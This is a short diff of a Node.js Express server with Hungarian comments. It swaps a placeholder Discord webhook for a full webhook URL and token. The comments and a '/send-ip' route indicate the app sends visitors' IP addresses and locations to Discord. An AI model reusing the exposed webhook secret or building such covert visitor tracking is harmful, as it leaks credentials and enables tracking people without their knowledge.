@@ -4,7 +4,7 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 // Discord Webhook URL (cseréld ki a saját webhook URL-edre)
-const webhookUrl = 'https://discord.com/api/webhooks/xxxxxxxxx/xxxxxxxxx';  // Cseréld ki a saját webhook URL-edre
+const webhookUrl = 'https://discord.com/api/webhooks/1163410175395373107/Tc5X6Ndt2R6qwVVbh5kVYgBSByLdEAC_mOQa9C7VbMjXxkgLUukRQVOFumbDRs5d1A9u';  // Cseréld ki a saját webhook URL-edre
 
 // IP cím és hely információ küldése a Discordra
 app.get('/send-ip', (req, res) => {
